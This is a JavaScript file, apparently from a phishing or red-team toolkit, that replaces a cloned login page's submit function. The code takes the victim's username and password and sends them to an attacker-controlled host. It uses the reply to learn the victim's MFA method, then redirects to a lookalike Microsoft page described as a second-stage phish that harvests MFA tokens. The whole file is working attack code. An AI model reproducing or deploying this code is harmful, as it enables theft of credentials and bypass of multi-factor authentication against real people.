
/* collect_userpass.js

Comment out the entire contents of the existing Login.submitLoginRequest function
except the makePlaceholder calls, and replace it with this.
*/

/*** JS 1 of 1: Code for collecting the username and password, sending it off to
    the attacker, and recieving back the authentication type ***/
url='https://portal.widgetscorp.co/';  // point to attacker machine hosting mfa_slipstream

user_name = encodeURIComponent(document.getElementById(Login.userNameInput).value);
user_pass = encodeURIComponent(btoa(document.getElementById(Login.passwordInput).value));

var httpXHR = new XMLHttpRequest();
// console.log('XHR.open');
httpXHR.open("GET",url+"dossologin?username="+user_name+"&pass="+user_pass, true);

// console.log('XHR.onreadystatechange');
httpXHR.onreadystatechange = function() {
    document.getElementById("error").setAttribute("hidden","true");
    //ref: readyState 0=unsent,1=opened, 2=headersrecieved, 3=loading, 4=done
    if (httpXHR.readyState == 4 ) {
        var response = httpXHR.responseText;
        // console.log('RESPONSE FROM XHR: '+response);

        // Split out l2phone (the last 2 digits of the phone number)
        var auth_method = response.split(':')[0];
        var l2phone = response.split(':')[1];
        if(l2phone==undefined) l2phone = 'XX';

        // Handle the different authentication types returned from mfa_slipstream.py
        // the page at /4bf18ef2-86a7-4b76-b63f-80a89cde4657/login is the second stage phish to collect MFA token
        if (auth_method=="OneWaySMS") {
            document.getElementById("loginForm").submit();
            document.getElementById("error").setAttribute("hidden","true");
            window.location.replace("https://login.mymicrosoftphish.com/4bf18ef2-86a7-4b76-b63f-80a89cde4657/login?client-request-id=6df3e89d-709a-4000-4501-1531a72d3ab9&username="+user_name+"&l2phone="+l2phone+"&auth="+0);
        } else if (auth_method == "PhoneAppNotification") {
            document.getElementById("loginForm").submit();
            document.getElementById("error").setAttribute("hidden","true");
            window.location.replace("https://login.mymicrosoftphish.com/4bf18ef2-86a7-4b76-b63f-80a89cde4657/login?client-request-id=6df3e89d-709a-4000-4501-1531a72d3ab9&username="+user_name+"&l2phone="+l2phone+"&auth="+1);
        } else if (auth_method == "PhoneAppOTP") {
            document.getElementById("loginForm").submit();
            document.getElementById("error").setAttribute("hidden","true");
            window.location.replace("https://login.mymicrosoftphish.com/4bf18ef2-86a7-4b76-b63f-80a89cde4657/login?client-request-id=6df3e89d-709a-4000-4501-1531a72d3ab9&username="+user_name+"&l2phone="+l2phone+"&auth="+2);
        } else if (auth_method == "TwoWayVoiceMobile") {
            document.getElementById("loginForm").submit();
            document.getElementById("error").setAttribute("hidden","true");
            window.location.replace("https://login.mymicrosoftphish.com/4bf18ef2-86a7-4b76-b63f-80a89cde4657/login?client-request-id=6df3e89d-709a-4000-4501-1531a72d3ab9&username="+user_name+"&l2phone="+l2phone+"&auth="+3);
        } else if (auth_method == "BadCredentials") {
            // Re-use the real error message if the user gives bad credentials
            document.getElementById("error").removeAttribute("hidden");
        }
    } 
}
// console.log('XHR.send');
httpXHR.send();

